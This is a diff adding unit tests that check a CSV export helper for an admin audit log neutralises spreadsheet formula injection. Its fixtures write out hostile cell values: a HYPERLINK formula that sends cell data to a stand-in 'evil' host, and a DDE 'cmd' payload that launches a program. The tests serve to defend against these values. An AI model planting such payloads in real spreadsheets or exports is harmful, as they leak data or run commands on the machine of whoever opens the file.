@@ -8,7 +8,7 @@ import { useUserStore } from "../store/user.js";
 import { nextTick } from "vue";
 
 import Audit from "../views/admin/Audit.vue";
-import { toJson, toCsv } from "../views/admin/auditExport.js";
+import { toJson, toCsv, csvEscape } from "../views/admin/auditExport.js";
 
 // ── Minimal fake EventSource ─────────────────────────────────────────────────
 class FakeEventSource {
@@ -260,6 +260,25 @@ describe("Audit.vue", () => {
     expect(lines[0]).toBe("time,event_type,actor,resource_ref,decision,tenant_id");
     // The resource_ref with a comma must be wrapped in quotes
     expect(lines[2]).toContain('"aikonos:tool:doc,write"');
+  });
+
+  // F73: a member-controlled cell must not run as a formula in the admin's
+  // spreadsheet.
+  it("csvEscape neutralises formula prefixes before quoting", () => {
+    expect(csvEscape('=HYPERLINK("https://evil/?"&A2,"x")')).toBe(`"'=HYPERLINK(""https://evil/?""&A2,""x"")"`);
+    expect(csvEscape("+1")).toBe("'+1");
+    expect(csvEscape("-2+3")).toBe("'-2+3");
+    expect(csvEscape("@SUM(A1)")).toBe("'@SUM(A1)");
+    expect(csvEscape("\t=1")).toBe("'\t=1");
+    expect(csvEscape("\r=1")).toBe(`"'\r=1"`);
+    expect(csvEscape("alice@example.com")).toBe("alice@example.com");
+    expect(csvEscape("2026-01-01T00:00:00.000Z")).toBe("2026-01-01T00:00:00.000Z");
+    expect(csvEscape(null)).toBe("");
+  });
+
+  it("toCsv neutralises a formula in an actor column", () => {
+    const csv = toCsv([{ actor_email: "=cmd|' /C calc'!A0", occurred_at: { seconds: 1, nanos: 0 } }]);
+    expect(csv.split("\n")[1].split(",")[2]).toBe("'=cmd|' /C calc'!A0");
   });
 
   // ── actor_email precedence: human label preferred over the stable oid ───────
